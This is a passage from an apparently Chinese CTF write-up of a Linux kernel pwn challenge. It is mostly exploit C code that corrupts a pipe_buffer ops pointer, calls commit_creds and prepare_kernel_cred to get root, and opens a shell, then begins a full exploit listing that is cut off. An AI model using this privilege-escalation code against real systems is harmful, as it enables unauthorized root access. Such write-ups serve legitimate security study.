class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// INFO: Step 0x05: write random value</span></span><br><span class="line">step(<span class="string">&quot;write random value&quot;</span>);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;inner pipe offset: %#x\n&quot;</span>, inner_pipe_offset);</span><br><span class="line">info(<span class="string">&quot;before writting:\n&quot;</span>);</span><br><span class="line">dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">char</span> *)(&amp;pipe_example) + inner_pipe_offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">check(ioctl(fd, <span class="number">0x1003</span>)); <span class="comment">// write</span></span><br><span class="line">info(<span class="string">&quot;write buffer+%#x &lt;- %#x\n&quot;</span>, AAA.rand_offset, AAA.rand_value);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;after writting:\n&quot;</span>);</span><br><span class="line">dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *fake_ops = pipe_example.ops;</span><br><span class="line"><span class="type">void</span> *fake_ops_page = (<span class="type">void</span> *)((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xFFFFFFFFFffff000</span>);</span><br><span class="line"><span class="type">uint32_t</span> fake_ops_page_offset = ((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe_example.ops == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;Useless write&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;affect pipe_buffer&#x27;s ops successfully\n&quot;</span>);</span><br><span class="line">success(<span class="string">&quot;pipe_buffer&#x27;s ops: %p\n&quot;</span>, pipe_example.ops);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;mmap page %p\n&quot;</span>, fake_ops_page);</span><br><span class="line"><span class="type">void</span> *mmap_page = mmap(fake_ops_page, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mmap_page != fake_ops_page) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;mmap error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// INFO: Step 0x06: close pipes</span></span><br><span class="line">step(<span class="string">&quot;close pipes&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ffffffff812c8d40 T commit_creds</span></span><br><span class="line"><span class="comment">// ffffffff812c8fd0 T prepare_kernel_cred</span></span><br><span class="line">commit_creds = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8d40</span>);</span><br><span class="line">prepare_kernel_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8fd0</span>);</span><br><span class="line">init_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff82a54120</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> win_addr = (<span class="type">uint64_t</span>)win;</span><br><span class="line">info(<span class="string">&quot;win address: %#lx\n&quot;</span>, win_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; ++i) &#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(fake_ops + i * <span class="number">8</span>, &amp;win_addr, <span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">  check(close(pipe_fd[i][<span class="number">0</span>]));</span><br><span class="line">  check(close(pipe_fd[i][<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shell();</span><br></pre></td></tr></table></figure>

<h3 id="æˆåŠŸget-root"><a href="#æˆåŠŸget-root" class="headerlink" title="æˆåŠŸget root"></a>æˆåŠŸget root</h3><blockquote>
<p>å äº†è¿™ä¹ˆå¤šéšæœºå› ç´ ï¼Œæœ€ç»ˆçš„æˆåŠŸç‡ç¡®å®å¤§æ‰“æŠ˜æ‰£ï¼Œè¯•äº†ä¸€ä¸‹å¤§æ¦‚ä¸åˆ°1&#x2F;40çš„æ ·å­</p>
</blockquote>
<p><img src="/images/ACTF-arandom/root.jpg" alt="get root :)"></p>
<p><del>å†è´´ä¸ªåˆ·å‡ºæ¥çš„æä½æ¦‚ç‡æƒ…å†µ</del></p>
<p><img src="/images/ACTF-arandom/random.jpg" alt="???"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ¬¡å¤ç°ç»™æˆ‘é˜…è¯»äº†å¤§é‡æºç ï¼ˆå¤ªç—›è‹¦äº†ï¼‰ï¼Œä½†æ€»ç®—å¯¹Kernelå†…å­˜ç®¡ç†æœºåˆ¶å…¥é—¨äº†ï¼Œä¹‹å‰å„ç§ç–‘æƒ‘ç‚¹éƒ½å¾—åˆ°äº†åˆç†çš„è§£é‡Šï¼Œæ„Ÿè§‰é€šé€äº†å¾ˆå¤š</p>
<blockquote>
<p><del>ç»ˆäºæ‚Ÿäº†</del></p>
</blockquote>
<h2 id="æœ€ç»ˆExpï¼ˆéƒ¨åˆ†ï¼‰"><a href="#æœ€ç»ˆExpï¼ˆéƒ¨åˆ†ï¼‰" class="headerlink" title="æœ€ç»ˆExpï¼ˆéƒ¨åˆ†ï¼‰"></a>æœ€ç»ˆExpï¼ˆéƒ¨åˆ†ï¼‰</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./klog.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span> <span class="comment">// æ·»åŠ  if_nametoindex å‡½æ•°çš„å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;threads.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC 0x200005401</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dump_hex</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> hex, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> i, cnt;</span><br><span class="line">  <span class="type">size_t</span> res = len % <span class="number">0x10</span>;</span><br><span class="line">  <span class="type">size_t</span> times = len / <span class="number">0x10</span> + (res ? <span class="number">0x1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> __len = (len &amp; (~<span class="number">0xf</span>)) + (res ? <span class="number">0x10</span> : <span class="number">0</span>);</span><br><span class="line">  <span class="type">char</span> *str = (<span class="type">char</span> *)<span class="built_in">malloc</span>(__len);</span><br><span class="line">  <span class="type">char</span> *__hex = (<span class="type">char</span> *)<span class="built_in">malloc</span>(__len);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, __len);</span><br><span class="line">  <span class="built_in">memcpy</span>(str, hex, len);</span><br><span class="line">  <span class="built_in">memcpy</span>(__hex, str, __len);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> l = <span class="number">0</span>; l &lt; __len; ++l) &#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= len || hex[l] &lt; <span class="string">&#x27; &#x27;</span> || hex[l] &gt;= <span class="number">0x7f</span>) &#123;</span><br><span class="line">      str[l] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> str1[<span class="number">0x9</span>], str2[<span class="number">0x9</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>, cnt = <span class="number">0</span>; i &lt; times; ++i) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(str1, str + cnt * <span class="number">0x8</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(str2, str + (cnt + <span class="number">1</span>) * <span class="number">0x8</span>, <span class="number">0x8</span>);</span><br><span class="line">    info(<span class="string">&quot;0x%04lx:  0x%016lx  0x%016lx    %s %s\n&quot;</span>, i * <span class="number">0x10</span>,</span><br><span class="line">         ((<span class="type">uint64_t</span> *)__hex)[cnt], ((<span class="type">uint64_t</span> *)__hex)[cnt + <span class="number">1</span>], str1, str2);</span><br><span class="line">    cnt += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(str);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *)KERNCALL = (<span class="type">void</span> *)<span class="number">0xffffffff81116130</span>;</span><br><span class="line"><span class="type">void</span> (*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *)<span class="number">0xffffffff81115e60</span>;</span><br><span class="line"><span class="type">void</span> *init_cred;</span><br><span class="line"></span><br><span class="line"><span class="comment">// cat /proc/kallsyms | grep &quot;prepare_kernel_cred&quot;</span></span><br><span class="line"><span class="comment">// sudo cat /proc/buddyinfo</span></span><br><span class="line"><span class="comment">// sudo cat /proc/pagetypeinfo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @fd openthe device;</span></span><br><span class="line"><span class="comment"> * @fd_tty openthe ptmx;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> fd, fd_tty;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">uint64_t</span> kernel_base, canary;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="comment">// uint64_t heap_address = 0;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> addr - <span class="number">0xffffffff81000000</span> + kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">unsigned</span> <span class="type">long</span> 